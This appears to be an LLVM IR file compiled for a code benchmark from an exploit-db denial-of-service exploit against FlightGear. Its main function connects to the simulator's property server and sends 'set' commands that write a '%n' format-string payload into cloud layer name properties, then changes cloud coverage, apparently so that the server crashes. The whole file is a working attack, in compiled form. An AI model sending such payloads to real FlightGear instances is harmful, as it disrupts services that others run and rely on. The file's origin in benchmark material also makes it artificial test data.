; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_24972.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_24972.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@DFLTHOST = common dso_local global i8* null, align 8
@DFLTPORT = common dso_local global i32 0, align 4
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [5 x i8] c"data\00", align 1
@.str.1 = private unnamed_addr constant [40 x i8] c"set /sim/rendering/clouds3d-enable true\00", align 1
@.str.2 = private unnamed_addr constant [24 x i8] c"set /environment/clouds\00", align 1
@.str.3 = private unnamed_addr constant [58 x i8] c"set /environment/cloudlayers/layers[%d]/cu/cloud/name %%n\00", align 1
@.str.4 = private unnamed_addr constant [58 x i8] c"set /environment/cloudlayers/layers[%d]/cb/cloud/name %%n\00", align 1
@.str.5 = private unnamed_addr constant [58 x i8] c"set /environment/cloudlayers/layers[%d]/ac/cloud/name %%n\00", align 1
@.str.6 = private unnamed_addr constant [58 x i8] c"set /environment/cloudlayers/layers[%d]/st/cloud/name %%n\00", align 1
@.str.7 = private unnamed_addr constant [58 x i8] c"set /environment/cloudlayers/layers[%d]/ns/cloud/name %%n\00", align 1
@.str.8 = private unnamed_addr constant [13 x i8] c"READ: \09<%s>\0A\00", align 1
@.str.9 = private unnamed_addr constant [53 x i8] c"set /environment/clouds/layer[%d]/coverage scattered\00", align 1
@.str.10 = private unnamed_addr constant [50 x i8] c"set /environment/clouds/layer[%d]/coverage cirrus\00", align 1
@.str.11 = private unnamed_addr constant [49 x i8] c"set /environment/clouds/layer[%d]/coverage clear\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"quit\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = load i32, i32* %4, align 4
  %12 = icmp sgt i32 %11, 1
  br i1 %12, label %13, label %17

13:                                               ; preds = %2
  %14 = load i8**, i8*** %5, align 8
  %15 = getelementptr inbounds i8*, i8** %14, i64 1
  %16 = load i8*, i8** %15, align 8
  br label %19

17:                                               ; preds = %2
  %18 = load i8*, i8** @DFLTHOST, align 8
  br label %19

19:                                               ; preds = %17, %13
  %20 = phi i8* [ %16, %13 ], [ %18, %17 ]
  store i8* %20, i8** %8, align 8
  %21 = load i32, i32* %4, align 4
  %22 = icmp sgt i32 %21, 2
  br i1 %22, label %23, label %28

23:                                               ; preds = %19
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 2
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @atoi(i8* %26)
  br label %30

28:                                               ; preds = %19
  %29 = load i32, i32* @DFLTPORT, align 4
  br label %30

30:                                               ; preds = %28, %23
  %31 = phi i32 [ %27, %23 ], [ %29, %28 ]
  store i32 %31, i32* %7, align 4
  %32 = load i8*, i8** %8, align 8
  %33 = load i32, i32* %7, align 4
  %34 = call i32 @fgfsconnect(i8* %32, i32 %33)
  store i32 %34, i32* %6, align 4
  %35 = load i32, i32* %6, align 4
  %36 = icmp slt i32 %35, 0
  br i1 %36, label %37, label %39

37:                                               ; preds = %30
  %38 = load i32, i32* @EXIT_FAILURE, align 4
  store i32 %38, i32* %3, align 4
  br label %107

39:                                               ; preds = %30
  %40 = load i32, i32* %6, align 4
  %41 = call i32 (i32, i8*, ...) @fgfswrite(i32 %40, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0))
  %42 = load i32, i32* %6, align 4
  %43 = call i32 (i32, i8*, ...) @fgfswrite(i32 %42, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.1, i64 0, i64 0))
  %44 = load i32, i32* %6, align 4
  %45 = call i32 (i32, i8*, ...) @fgfswrite(i32 %44, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.2, i64 0, i64 0))
  store i32 0, i32* %10, align 4
  br label %46

46:                                               ; preds = %65, %39
  %47 = load i32, i32* %10, align 4
  %48 = icmp slt i32 %47, 5
  br i1 %48, label %49, label %68

49:                                               ; preds = %46
  %50 = load i32, i32* %6, align 4
  %51 = load i32, i32* %10, align 4
  %52 = call i32 (i32, i8*, ...) @fgfswrite(i32 %50, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.3, i64 0, i64 0), i32 %51)
  %53 = load i32, i32* %6, align 4
  %54 = load i32, i32* %10, align 4
  %55 = call i32 (i32, i8*, ...) @fgfswrite(i32 %53, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.4, i64 0, i64 0), i32 %54)
  %56 = load i32, i32* %6, align 4
  %57 = load i32, i32* %10, align 4
  %58 = call i32 (i32, i8*, ...) @fgfswrite(i32 %56, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.5, i64 0, i64 0), i32 %57)
  %59 = load i32, i32* %6, align 4
  %60 = load i32, i32* %10, align 4
  %61 = call i32 (i32, i8*, ...) @fgfswrite(i32 %59, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.6, i64 0, i64 0), i32 %60)
  %62 = load i32, i32* %6, align 4
  %63 = load i32, i32* %10, align 4
  %64 = call i32 (i32, i8*, ...) @fgfswrite(i32 %62, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.7, i64 0, i64 0), i32 %63)
  br label %65

65:                                               ; preds = %49
  %66 = load i32, i32* %10, align 4
  %67 = add nsw i32 %66, 1
  store i32 %67, i32* %10, align 4
  br label %46

68:                                               ; preds = %46
  %69 = load i32, i32* %6, align 4
  %70 = call i8* @fgfsread(i32 %69, i32 3)
  store i8* %70, i8** %9, align 8
  %71 = load i8*, i8** %9, align 8
  %72 = icmp ne i8* %71, null
  br i1 %72, label %73, label %76

73:                                               ; preds = %68
  %74 = load i8*, i8** %9, align 8
  %75 = call i32 @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.8, i64 0, i64 0), i8* %74)
  br label %76

76:                                               ; preds = %73, %68
  store i32 0, i32* %10, align 4
  br label %77

77:                                               ; preds = %90, %76
  %78 = load i32, i32* %10, align 4
  %79 = icmp slt i32 %78, 5
  br i1 %79, label %80, label %93

80:                                               ; preds = %77
  %81 = load i32, i32* %6, align 4
  %82 = load i32, i32* %10, align 4
  %83 = call i32 (i32, i8*, ...) @fgfswrite(i32 %81, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.9, i64 0, i64 0), i32 %82)
  %84 = load i32, i32* %6, align 4
  %85 = load i32, i32* %10, align 4
  %86 = call i32 (i32, i8*, ...) @fgfswrite(i32 %84, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.10, i64 0, i64 0), i32 %85)
  %87 = load i32, i32* %6, align 4
  %88 = load i32, i32* %10, align 4
  %89 = call i32 (i32, i8*, ...) @fgfswrite(i32 %87, i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.11, i64 0, i64 0), i32 %88)
  br label %90

90:                                               ; preds = %80
  %91 = load i32, i32* %10, align 4
  %92 = add nsw i32 %91, 1
  store i32 %92, i32* %10, align 4
  br label %77

93:                                               ; preds = %77
  %94 = load i32, i32* %6, align 4
  %95 = call i8* @fgfsread(i32 %94, i32 3)
  store i8* %95, i8** %9, align 8
  %96 = load i8*, i8** %9, align 8
  %97 = icmp ne i8* %96, null
  br i1 %97, label %98, label %101

98:                                               ; preds = %93
  %99 = load i8*, i8** %9, align 8
  %100 = call i32 @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.8, i64 0, i64 0), i8* %99)
  br label %101

101:                                              ; preds = %98, %93
  %102 = load i32, i32* %6, align 4
  %103 = call i32 (i32, i8*, ...) @fgfswrite(i32 %102, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i64 0, i64 0))
  %104 = load i32, i32* %6, align 4
  %105 = call i32 @fgfsclose(i32 %104)
  %106 = load i32, i32* @EXIT_SUCCESS, align 4
  store i32 %106, i32* %3, align 4
  br label %107

107:                                              ; preds = %101, %37
  %108 = load i32, i32* %3, align 4
  ret i32 %108
}

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @fgfsconnect(i8*, i32) #1

declare dso_local i32 @fgfswrite(i32, i8*, ...) #1

declare dso_local i8* @fgfsread(i32, i32) #1

declare dso_local i32 @printf(i8*, i8*) #1

declare dso_local i32 @fgfsclose(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
